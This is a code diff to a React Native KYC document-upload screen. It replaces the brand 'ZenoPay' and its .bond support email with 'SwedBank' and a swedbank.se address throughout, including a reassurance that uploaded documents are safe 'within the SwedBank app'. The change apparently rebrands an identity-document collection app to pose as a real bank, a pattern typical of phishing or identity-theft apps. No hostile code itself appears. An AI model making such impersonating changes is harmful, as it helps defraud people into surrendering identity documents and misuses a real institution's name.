@@ -99,7 +99,7 @@ export default function KYCScreen() {
   };
 
   const handleEmailSupport = () => {
-    Linking.openURL('mailto:info@zenopay.bond');
+    Linking.openURL('mailto:info@swedbank.se');
   };
 
   if (submitted) {
@@ -116,19 +116,19 @@ export default function KYCScreen() {
             </Text>
 
             <Text style={styles.description}>
-              Please wait for Zenopay to approve your account. Approval time is
+              Please wait for SwedBank to approve your account. Approval time is
               between <Text style={styles.bold}>1 to 6 hours</Text>.
             </Text>
 
             <Text style={styles.description}>
               If you need assistance, contact support at:{' '}
               <Text style={styles.emailLink} onPress={handleEmailSupport}>
-                info@zenopay.bond
+                info@swedbank.se
               </Text>
             </Text>
 
             <Text style={styles.securityNote}>
-              Your documents are stored securely and are safe within the Zenopay
+              Your documents are stored securely and are safe within the SwedBank
               app.
             </Text>
           </View>
@@ -145,7 +145,7 @@ export default function KYCScreen() {
     <SafeAreaView style={styles.container} edges={['top', 'bottom']}>
       <ScrollView contentContainerStyle={styles.scrollContent}>
         <View style={styles.content}>
-          <Text style={styles.header}>ZenoPay</Text>
+          <Text style={styles.header}>SwedBank</Text>
 
           <Text style={styles.title}>PLEASE UPLOAD KYC DOCUMENTS</Text>
 
